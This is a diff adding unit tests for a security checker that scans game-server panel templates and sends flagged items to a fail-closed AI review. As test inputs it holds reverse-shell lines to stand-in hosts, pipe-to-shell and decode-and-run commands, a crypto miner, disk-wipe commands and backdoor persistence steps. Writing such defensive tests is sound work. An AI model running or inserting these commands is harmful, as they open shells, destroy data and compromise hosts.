@@ -1,0 +1,184 @@
+"""Tests for tools/security_check.py: python3 -m unittest discover -s tools -p "test_*.py" """
+import json
+import os
+import sys
+import unittest
+from types import SimpleNamespace
+from unittest import mock
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+import security_check as sc  # noqa: E402
+
+
+def template(commands=(), run="./server", env=None, host_config=None, steps=()):
+    t = {
+        "type": "test",
+        "install": [{"type": "command", "commands": list(commands)}, *steps],
+        "run": {"command": run, "environmentVars": env or {}},
+        "environment": {"type": "docker", "image": "ubuntu:24.04"},
+        "supportedEnvironments": [{"type": "docker", "image": "ubuntu:24.04", **({"hostConfig": host_config} if host_config else {})}],
+    }
+    return t
+
+
+def findings(t, old=None):
+    return sc.rule_findings("t", t, old)
+
+
+def rules(t, level=None):
+    return {f.rule for f in findings(t) if level is None or f.level == level}
+
+
+class BlockRules(unittest.TestCase):
+    def test_dangerous_commands_are_blocked(self):
+        cases = {
+            "reverse-shell": ["bash -i >& /dev/tcp/203.0.113.5/4444 0>&1", "nc -e /bin/sh evil.example 4444",
+                              "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 80 > /tmp/f"],
+            "pipe-to-shell": ["curl -fsSL https://get.example.sh | bash", "wget -qO- https://x.example/i.sh | sh",
+                              "bash <(curl -s https://x.example/a)", "sh -c \"$(curl -fsSL https://x.example/a)\""],
+            "decode-and-run": ["echo aGVsbG8= | base64 -d | sh", "eval \"$(echo ZWNobw== | base64 --decode)\""],
+            "crypto-miner": ["./xmrig -o stratum+tcp://pool.example:3333", "wget https://github.com/x/xmrig/releases/x.tgz"],
+            "wipe": ["rm -rf /", "rm -rf --no-preserve-root /", "rm -fr /etc", "dd if=/dev/zero of=/dev/sda"],
+            "host-system": ["echo '* * * * * x' | crontab -", "echo key >> ~/.ssh/authorized_keys", "useradd backdoor",
+                            "iptables -F", "curl --unix-socket /var/run/docker.sock http://x/containers/json"],
+        }
+        for rule, commands in cases.items():
+            for cmd in commands:
+                with self.subTest(cmd=cmd):
+                    self.assertIn(rule, rules(template([cmd]), "block"))
+
+    def test_privileged_container_and_preload_are_blocked(self):
+        self.assertIn("docker-privileged", rules(template(host_config={"Privileged": True}), "block"))
+        self.assertIn("sensitive-env", rules(template(env={"LD_PRELOAD": "/tmp/x.so"}), "block"))
+
+    def test_a_written_script_is_checked_like_a_command(self):
+        t = template(steps=[{"type": "writefile", "target": "start.sh", "text": "#!/bin/sh\ncurl https://x.example/p | sh\n"}])
+        self.assertIn("pipe-to-shell", rules(t, "block"))
+
+    def test_blocks_cannot_be_accepted_from_the_allow_list(self):
+        with mock.patch.object(sc, "load_allow", return_value={("t", "pipe-to-shell", "install[0].commands[0]")}):
+            self.assertIn("pipe-to-shell", rules(template(["curl https://x.example | sh"]), "block"))
+
+
+class ReviewRules(unittest.TestCase):
+    def test_unusual_things_go_to_review(self):
+        cases = {
+            "untrusted-host": ["curl -o server.jar https://files.unknown-host.example/server.jar"],
+            "sudo": ["sudo apt-get install -y lib32gcc-s1"],
+            "background": ["nohup ./helper &"],
+            "setuid": ["chmod 777 /SkyPanel", "chmod u+s ./tool", "chmod 4755 ./tool"],
+            "raw-ip": ["wget http://198.51.100.7/file.zip"],
+            "eval": ["eval \"$EXTRA\""],
+        }
+        for rule, commands in cases.items():
+            for cmd in commands:
+                with self.subTest(cmd=cmd):
+                    found = findings(template([cmd]))
+                    self.assertIn(rule, {f.rule for f in found if f.level == "review"})
+                    self.assertFalse(any(f.level == "block" for f in found), cmd)
+
+    def test_download_steps_docker_settings_and_paths(self):
+        t = template(steps=[{"type": "download", "files": ["https://cdn.unknown.example/a.zip"]},
+                            {"type": "writefile", "target": "../../etc/x", "text": "x"}],
+                     host_config={"NetworkMode": "host", "Init": True},
+                     env={"LD_LIBRARY_PATH": "/usr/evil"})
+        got = {(f.rule, f.detail) for f in findings(t)}
+        self.assertIn(("untrusted-host", "cdn.unknown.example"), got)
+        self.assertIn(("docker-setting", "NetworkMode"), got)
+        self.assertIn(("sensitive-env", "LD_LIBRARY_PATH"), got)
+        self.assertIn("path-outside", {r for r, _ in got})
+        self.assertNotIn(("docker-setting", "Init"), got)
+
+    def test_the_allow_list_accepts_a_review_by_its_detail(self):
+        cmd = "curl -o x https://files.unknown-host.example/x"
+        with mock.patch.object(sc, "load_allow", return_value={("t", "untrusted-host", "files.unknown-host.example")}):
+            self.assertEqual(rules(template([cmd])), set())
+
+
+class NoFalseAlarms(unittest.TestCase):
+    def test_everyday_template_content_passes(self):
+        commands = [
+            "bash -c \"for try in 1 2 3; do steamcmd +force_install_dir /SkyPanel +login anonymous +app_update 2394010 validate +quit && exit 0; sleep 15; done; exit 1\"",
+            "curl -fsSL -o server.jar https://api.papermc.io/v2/projects/paper/versions/1.21/builds/1/downloads/paper.jar",
+            "wget https://github.com/lavalink-devs/Lavalink/releases/download/4.0.0/Lavalink.jar",
+            "rm -f Lavalink.jar", "rm -rf node_modules", "rm -rf /SkyPanel/cache",
+            "chmod +x ./PalServer.sh", "./PalServer.sh -port=8211 -queryport=27015 -players=32",
+            "npm install --no-audit --no-fund", "pip install -r requirements.txt",
+            "curl -o x.zip https://${DOWNLOAD_HOST}/x.zip",
+        ]
+        t = template(commands, env={"LD_LIBRARY_PATH": "./linux64:$LD_LIBRARY_PATH", "PORT": "${port}"},
+                     host_config={"Init": True},
+                     steps=[{"type": "writefile", "target": "/Servers/x/Commands.dat", "text": "Port 27015\n"}])
+        self.assertEqual([(f.rule, f.text) for f in findings(t)], [])
+
+    def test_every_published_template_passes(self):
+        self.assertEqual(sc.main(["--all", "--no-ai"]), 0)
+
+
+class OnlyWhatChanged(unittest.TestCase):
+    def test_content_the_old_version_had_is_not_checked_again(self):
+        old = template(["sudo apt-get install -y x"])
+        new = template(["sudo apt-get install -y x", "nohup ./y &"])
+        self.assertEqual({f.rule for f in findings(new, old)}, {"background"})
+
+
+class ClaudeReview(unittest.TestCase):
+    def fake_client(self, *, stop_reason="end_turn", text=None, error=None):
+        calls = []
+
+        def create(**kwargs):
+            calls.append(kwargs)
+            if error:
+                raise error
+            body = text if text is not None else json.dumps({"verdict": "safe", "summary": "Descarga del fabricante.", "findings": []})
+            return SimpleNamespace(stop_reason=stop_reason, content=[SimpleNamespace(type="text", text=body)])
+
+        client = SimpleNamespace(beta=SimpleNamespace(messages=SimpleNamespace(create=create)))
+        return client, calls
+
+    def review(self, client):
+        f = findings(template(["sudo apt-get install -y x"]))
+        return sc.ai_review("t", template(["sudo apt-get install -y x"]), None, f, client=client)
+
+    def test_safe_verdict_and_request_shape(self):
+        client, calls = self.fake_client()
+        self.assertEqual(self.review(client)["verdict"], "safe")
+        req = calls[0]
+        self.assertEqual(req["model"], "claude-opus-5-5")
+        self.assertEqual(req["fallbacks"], "default")
+        self.assertEqual(req["betas"], ["server-side-fallback-2026-07-01"])
+        self.assertEqual(req["output_config"]["format"]["schema"], sc.VERDICT_SCHEMA)
+        self.assertIn("sudo apt-get install -y x", req["messages"][0]["content"])
+        self.assertIn("untrusted data", req["system"])
+
+    def test_problems_fail_closed(self):
+        for kwargs in ({"stop_reason": "refusal"}, {"stop_reason": "max_tokens"}, {"text": "not json"},
+                       {"text": json.dumps({"verdict": "maybe", "summary": "", "findings": []})}):
+            with self.subTest(**kwargs):
+                client, _ = self.fake_client(**kwargs)
+                self.assertEqual(self.review(client)["verdict"], "unsure")
+
+    def test_without_a_key_review_findings_need_a_person(self):
+        with mock.patch.dict(os.environ, {}, clear=True):
+            f = findings(template(["sudo x"]))
+            self.assertEqual(sc.ai_review("t", template(["sudo x"]), None, f)["verdict"], "unsure")
+
+
+class Report(unittest.TestCase):
+    def test_pass_and_fail(self):
+        review = findings(template(["sudo x"]))
+        block = findings(template(["curl https://x.example | sh"]))
+        _, ok = sc.report([("a", [], None)])
+        self.assertTrue(ok)
+        _, ok = sc.report([("a", review, {"verdict": "safe", "summary": "ok", "findings": []})])
+        self.assertTrue(ok)
+        for verdict in ("unsure", "unsafe"):
+            text, ok = sc.report([("a", review, {"verdict": verdict, "summary": "x", "findings": []})])
+            self.assertFalse(ok)
+            self.assertIn("Para aceptarlo: `t sudo", text)
+        _, ok = sc.report([("a", block, None)])
+        self.assertFalse(ok)
+
+
+if __name__ == "__main__":
+    unittest.main()
